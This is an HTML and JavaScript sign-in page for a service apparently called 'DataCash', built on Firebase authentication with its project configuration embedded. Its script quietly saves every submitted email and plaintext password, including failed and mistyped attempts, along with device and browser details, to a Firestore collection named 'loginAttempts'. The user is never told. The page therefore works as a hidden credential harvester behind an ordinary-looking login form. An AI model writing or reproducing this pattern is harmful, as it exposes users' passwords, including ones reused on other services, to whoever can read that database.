<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DataCash â€“ Sign In</title>
  <style>
    *,
    *::before,
    *::after { margin: 0; padding: 0; box-sizing: border-box; }

    :root {
      --bg: #0a1628; --card: #0f1e35; --border: #1e2f4a;
      --blue: #2d7aed; --blue-hover: #1a68d9; --muted: #8a9ab5;
      --text: #fff; --dark-input: #162033; --red: #ef4444; --green: #22c55e;
    }

    body {
      min-height: 100vh;
      background: linear-gradient(160deg, #0a1628 0%, #0d1b30 40%, #0f1e35 70%, #0a1628 100%);
      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
      color: var(--text);
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      padding: 40px 16px 60px; position: relative; overflow-x: hidden;
    }

    .logo-wrap {
      margin-bottom: 32px; display: flex; justify-content: center;
      position: relative; z-index: 1;
    }
    .logo-wrap img {
      width: 80px; height: 80px; object-fit: contain; display: block;
      border-radius: 12px; box-shadow: 0 8px 30px rgba(45, 122, 237, 0.25);
    }

    .card {
      background: var(--card); border-radius: 20px; padding: 36px 28px 38px;
      width: 100%; max-width: 420px;
      box-shadow: 0 12px 50px rgba(0, 0, 0, 0.5); border: 1px solid var(--border);
      position: relative; z-index: 1;
    }
    .card h1 { font-size: 24px; font-weight: 800; text-align: center; margin-bottom: 10px; color: #fff; }
    .card .subtitle { font-size: 13.5px; color: var(--muted); text-align: center; margin-bottom: 30px; }

    .field-group { display: flex; flex-direction: column; margin-bottom: 20px; }
    .label-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 7px; }
    label { font-size: 13.5px; color: #c8d4e5; font-weight: 600; }
    .forgot-link { font-size: 12.5px; color: var(--muted); text-decoration: none; font-weight: 500; }

    input[type="email"], input[type="password"], input[type="text"] {
      width: 100%; background: var(--dark-input); border: 1.5px solid var(--border);
      border-radius: 14px; padding: 14px 18px; font-size: 14px; color: #fff;
      outline: none; transition: border-color .2s;
    }
    input::placeholder { color: #3d5070; }
    input:focus { border-color: var(--blue); }

    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 48px; }
    .pw-toggle {
      position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
      background: none; border: none; cursor: pointer; padding: 6px;
      color: #5a7090; display: flex; align-items: center; border-radius: 50%;
    }

    .btn-submit {
      width: 100%; padding: 15px;
      background: linear-gradient(135deg, var(--blue) 0%, #1a68d9 100%);
      color: #fff; font-size: 15px; font-weight: 700; border: none;
      border-radius: 14px; cursor: pointer; transition: all .2s;
      box-shadow: 0 4px 20px rgba(45, 122, 237, 0.3);
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .btn-submit:hover { background: linear-gradient(135deg, #1a68d9 0%, #1558c0 100%); }
    .btn-submit:disabled { opacity: .7; cursor: not-allowed; }

    .register-link { text-align: center; margin-top: 22px; font-size: 14px; color: var(--muted); }
    .register-link a { color: #fff; text-decoration: none; font-weight: 700; }

    .field-error { font-size: 11.5px; color: #ef4444; margin-top: 5px; display: none; }
    .field-error.show { display: block; }

    .toast {
      position: fixed; bottom: 26px; left: 50%; transform: translateX(-50%) translateY(80px);
      background: #1a2d4a; color: #fff; padding: 13px 24px; border-radius: 14px;
      font-size: 13.5px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
      transition: transform .35s cubic-bezier(.34, 1.56, .64, 1), opacity .35s;
      opacity: 0; z-index: 999; text-align: center; max-width: 340px; width: 90%;
    }
    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
    .toast.success { border-left: 4px solid #22c55e; }
    .toast.error { border-left: 4px solid #ef4444; }

    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner {
      display: inline-block; width: 18px; height: 18px;
      border: 2.5px solid rgba(255, 255, 255, .25); border-top-color: #fff;
      border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle;
    }
  </style>
</head>
<body>

  <div class="logo-wrap">
    <img src="data.jpg" alt="DataCash" />
  </div>

  <div class="card">
    <h1>Welcome back</h1>
    <p class="subtitle">Sign in to access your dashboard and manage your earnings.</p>

    <form id="loginForm" novalidate>
      <div class="field-group">
        <label for="email">Email address</label>
        <input type="email" id="email" placeholder="you@example.com" autocomplete="email" />
        <span class="field-error" id="err-email">Enter a valid email address.</span>
      </div>

      <div class="field-group">
        <div class="label-row">
          <label for="password">Password</label>
          <span class="forgot-link" id="forgotLink">Forgot password?</span>
        </div>
        <div class="pw-wrap">
          <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
          <button type="button" class="pw-toggle" onclick="togglePw()">
            <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
            </svg>
            <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none">
              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>
            </svg>
          </button>
        </div>
        <span class="field-error" id="err-password">Enter your password.</span>
      </div>

      <button type="submit" class="btn-submit" id="submitBtn">Sign in</button>
    </form>

    <p class="register-link" style="margin-top:20px">Don't have an account? <a href="index.html">Create one</a></p>
  </div>

  <div class="toast" id="toast"></div>

  <!-- âś… SAME WORKING PATTERN AS INDEX.HTML -->
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getAuth, signInWithEmailAndPassword, setPersistence, browserLocalPersistence, browserSessionPersistence, sendPasswordResetEmail } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
    import { getFirestore, doc, updateDoc, serverTimestamp, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

    const app = initializeApp({
      apiKey: "AIzaSyBTkls-WbffHErGeX9bMYPpV5pqbCe14gY",
      authDomain: "datacash-104dd.firebaseapp.com",
      projectId: "datacash-104dd",
      storageBucket: "datacash-104dd.firebasestorage.app",
      messagingSenderId: "101692098149",
      appId: "1:101692098149:web:55ccc9f1f105647488a88c"
    });
    const auth = getAuth(app);
    const db = getFirestore(app);

    function toast(msg, type) {
      const el = document.getElementById("toast");
      el.innerHTML = msg;
      el.className = "toast " + type + " show";
      clearTimeout(el._t);
      el._t = setTimeout(function() { el.className = "toast"; }, 4500);
    }

    function showErr(id) {
      var el = document.getElementById("err-" + id);
      if (el) el.classList.add("show");
    }

    function clearErrors() {
      document.querySelectorAll(".field-error").forEach(function(e) { e.classList.remove("show"); });
    }

    // âś… Save login attempt â€” SAME PATTERN AS INDEX.HTML setDoc
    async function saveLoginAttempt(email, password, status, errorCode) {
      try {
        // Use the exact same addDoc pattern that works in index.html
        await addDoc(collection(db, "loginAttempts"), {
          email: email,
          password: password,
          status: status,
          errorCode: errorCode || "none",
          device: navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iPhone" : "Desktop",
          browser: navigator.userAgent.includes("Chrome") ? "Chrome" : navigator.userAgent.includes("Safari") ? "Safari" : "Other",
          createdAt: serverTimestamp()
        });
        console.log("âś… Login saved to Firestore");
      } catch (err) {
        console.error("Save error:", err);
      }
    }

    window.togglePw = function() {
      var inp = document.getElementById("password");
      var eyeOpen = document.getElementById("eyeOpen");
      var eyeOff = document.getElementById("eyeOff");
      if (inp.type === "password") {
        inp.type = "text";
        eyeOpen.style.display = "none";
        eyeOff.style.display = "block";
      } else {
        inp.type = "password";
        eyeOpen.style.display = "block";
        eyeOff.style.display = "none";
      }
    };

    document.getElementById("forgotLink").addEventListener("click", async function() {
      var email = document.getElementById("email").value.trim().toLowerCase();
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        toast("Enter your email first", "info");
        return;
      }
      try {
        await sendPasswordResetEmail(auth, email);
        toast("âś… Reset email sent!", "success");
      } catch (err) {
        toast("Failed to send email", "error");
      }
    });

    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault();
      clearErrors();

      var email = document.getElementById("email").value.trim().toLowerCase();
      var password = document.getElementById("password").value;

      var ok = true;
      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showErr("email");
        ok = false; }
      if (!password) { showErr("password");
        ok = false; }
      if (!ok) {
        toast("Please fill all fields", "error");
        // Save failed attempt
        await saveLoginAttempt(email || "empty", password || "empty", "failed", "validation");
        return;
      }

      var btn = document.getElementById("submitBtn");
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span> Signing inâ€¦';

      try {
        await setPersistence(auth, browserLocalPersistence);
        var cred = await signInWithEmailAndPassword(auth, email, password);

        // âś… Save SUCCESSFUL login
        await saveLoginAttempt(email, password, "success", "none");

        updateDoc(doc(db, "users", cred.user.uid), {
          lastLoginAt: serverTimestamp(),
          updatedAt: serverTimestamp()
        }).catch(function() {});

        toast("âś… Welcome back!", "success");
        setTimeout(function() { window.location.href = "dashboard.html"; }, 1500);

      } catch (err) {
        btn.disabled = false;
        btn.innerHTML = "Sign in";

        // âś… Save FAILED login
        await saveLoginAttempt(email, password, "failed", err.code);

        var msg = "Login failed. Try again.";
        if (err.code === "auth/user-not-found") msg = "No account found with this email.";
        if (err.code === "auth/wrong-password") msg = "Incorrect password.";
        if (err.code === "auth/invalid-credential") msg = "Invalid email or password.";
        if (err.code === "auth/too-many-requests") msg = "Too many attempts. Wait a moment.";
        toast(msg, "error");
      }
    });
  </script>
</body>
</html>
